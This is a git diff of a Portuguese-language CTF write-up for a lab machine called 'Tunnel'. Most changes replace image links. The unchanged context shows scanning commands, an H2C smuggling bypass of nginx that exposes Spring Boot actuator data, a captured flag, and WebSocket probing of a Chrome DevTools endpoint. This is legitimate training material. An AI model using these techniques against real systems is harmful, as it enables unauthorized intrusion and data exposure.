@@ -17,13 +17,12 @@ comments: true
 
 ### 1.1 Scan de portas
 
-![Nmap Port Scan](tunnel/portscanNmap.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/47dffbac-2eea-4c65-b6b7-f51d8582842b" />
 
 ```bash
 nmap -sV 172.16.3.113
 ```
-
-![Port Scan Results](tunnel/portscan.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/3f824288-3cf3-486d-b3c8-f9a9ce516e10" />
 
 ```bash
 rustscan -a 172.16.3.113
@@ -42,7 +41,7 @@ ffuf -c -u http://172.16.3.113:8000/FUZZ \
      -w ~/SecLists/Discovery/Web-Content/raft-large-words.txt -t 150
 ```
 
-![Initial Fuzzing](tunnel/ffuf-1.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/bcbd33eb-7cc2-4fab-8487-f15b40896f62" />
 
 **Descobertas importantes:**
 
@@ -51,7 +50,7 @@ ffuf -c -u http://172.16.3.113:8000/FUZZ \
 /actuator   → 403 Forbidden
 ```
 
-![Error Page](tunnel/error.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/c0539110-3f00-4079-82d6-18a82da77a50" />
 
 **Análise técnica:**
 A presença de "*Whitelabel Error Page*" e o diretório "*actuator*" indica **Spring Boot Framework**. Esta identificação nos permite usar wordlists específicas para enumerar endpoints do Spring Boot Actuator.
@@ -60,7 +59,7 @@ A presença de "*Whitelabel Error Page*" e o diretório "*actuator*" indica **Sp
 
 ### 2.1 Wordlist especializada
 
-![Spring Boot Fuzzing](tunnel/ffuf-2-springBoot.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/a953fe73-eb8f-4604-88cd-0c11afac6b24" />
 
 ```bash
 ffuf -c -u http://172.16.3.113:8000/FUZZ \
@@ -127,7 +126,7 @@ cliente → nginx (HTTP/1.1 proxy) → backend (Spring Boot + h2c support)
    - Nginx não consegue mais inspecionar/filtrar requisições
    - Todas as regras de proxy_pass são ignoradas
 
-![H2C Smuggling Diagram](tunnel/H2C-Smuggling-White.jpg)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/1ab35a7c-a8c2-4924-a00b-7fc576e06535" />
 
 ### 4.4 Implicações de segurança do bypass
 
@@ -168,7 +167,7 @@ source ~/.bashrc
 
 ### 5.2 Testando vulnerabilidade
 
-![H2C Test](tunnel/h2cTest.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/5cab71a2-5ca7-4906-8373-effa398878f3" />
 
 ```bash
 h2csmuggler -x http://172.16.3.113:8000 --test
@@ -197,13 +196,13 @@ h2csmuggler -x http://172.16.3.113:8000 http://backend/actuator
 h2csmuggler -x http://172.16.3.113:8000 http://backend/actuator/env
 ```
 
-![H2C Actuator Env](tunnel/h2csm-act-env.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/dd25fd9f-4122-4d15-9d60-81496f98a51a" />
 
 Se formos ao final do arquivo poderemos identificar o JSON que esperamos do /env
 
 ## 6. Informações sensíveis encontradas no /actuator/env
 
-![H2C Actuator JSON](tunnel/h2csm-act-env-JSON.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/aba4d6c3-4061-4527-8219-5b175216c2c8" />
 
 Ao analisar o JSON retornado do `/env` (utilizando um formatter para melhor legibilidade), identificamos:
 
@@ -213,13 +212,13 @@ Ao analisar o JSON retornado do `/env` (utilizando um formatter para melhor legi
 hackingclub{c71b3ebb3e25f3c8304d9010a1c3765742309a3f}
 ```
 
-![JSON Flag 1](tunnel/json-flag1.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/c05b08ba-cc27-4adc-9fb2-f205fe80af69" />
 
 ### 6.1 Endpoints importantes descobertos
 
 Juntando o que encontramos anteriormente com esse json podemos identificar/mapear importantes pontos para exploração
 
-![Spring Boot Endpoints](tunnel/ffuf-2-springBoot-HeapDump-Env.png)
+<img width="800" height="699" alt="image" src="https://github.com/user-attachments/assets/94b837cd-1b99-446c-bc3b-e3995206f6b8" />
 
 **Endpoints mapeados:**
 
@@ -235,7 +234,7 @@ Juntando o que encontramos anteriormente com esse json podemos identificar/mapea
 /admin/internal-web-socket-endpoint
 ```
 
-![JSON Debug Path](tunnel/json_beautifier_debug_path.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/6d4ff368-01bd-44a9-a930-c6800edf0530" />
 
 ### 6.2 Chrome DevTools Protocol (CDP) - Contexto técnico
 
@@ -277,7 +276,7 @@ GET http://172.16.3.113:8000/admin/internal-web-socket-endpoint/
 WebSocket request was expected
 ```
 
-![WebSocket Expected](tunnel/websocketExpectedAdmin.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/804f407a-ad91-45d9-a59d-ebfaf4d86ed5" />
 
 **Análise:**
 
@@ -286,11 +285,11 @@ WebSocket request was expected
 
 ### 7.2 Tentando conexão WebSocket
 
-![Postman 1](tunnel/postamn1.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/814ab118-bb9c-494e-9ea3-37beadae9520" />
 
-Utilizando o Postman para testar WebSocket:
+Utilizando o Postman para testar, vamos criar não apenas para WebSocket como também para HTTP :
 
-![Postman 2](tunnel/postman2.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/ab46653e-c951-49eb-af92-f829429a53a3" />
 
 **Testando WebSocket direto:**
 
@@ -304,7 +303,7 @@ ws://172.16.3.113:8000/admin/internal-web-socket-endpoint/
 Unexpected server response: 400
 ```
 
-![Postman WebSocket 1](tunnel/postman-ws1.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/d1646138-3ed5-4d08-812d-a6fa3a577c14" />
 
 **Conclusão:** Não é o WebSocket principal — falta descobrir o caminho correto.
 
@@ -349,7 +348,7 @@ A URL do WebSocket debug usa a raiz + ID. Como estamos acessando via `/admin/int
 ws://172.16.3.113:8000/admin/internal-web-socket-endpoint/7efa5220-45c7-44c2-b367-d9068de778bd
 ```
 
-![Postman JSON List](tunnel/postman-http-json-list.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/d47d4b67-07eb-4888-acef-3f69381a0b8a" />
 
 **✅ Conexão WebSocket aceita com sucesso no Postman.**
 
@@ -363,7 +362,7 @@ ws://172.16.3.113:8000/admin/internal-web-socket-endpoint/7efa5220-45c7-44c2-b36
 {}
 ```
 
-![Postman WebSocket 3](tunnel/postman-ws3.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/cd232c50-857d-4829-98e9-13b4f6232048" />
 
 **Erros obtidos:**
 
@@ -946,7 +945,8 @@ Este cenário demonstra uma **cadeia crítica** onde múltiplas vulnerabilidades
 
 ---
 
-![Tunnel Machine](tunnel/tunnel_machine_176.png)
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/31368014-08f4-4943-a1d6-521341f4c673" />
+
 
 **Flags capturadas:**
 
@@ -960,3 +960,5 @@ Este cenário demonstra uma **cadeia crítica** onde múltiplas vulnerabilidades
 - Chrome DevTools Protocol RCE
 - Docker privilege escalation
 - Host filesystem mounting
+
+<img width="800" alt="image" src="https://github.com/user-attachments/assets/f0667214-3a4e-4ad9-b792-0d97287fb8ca" />
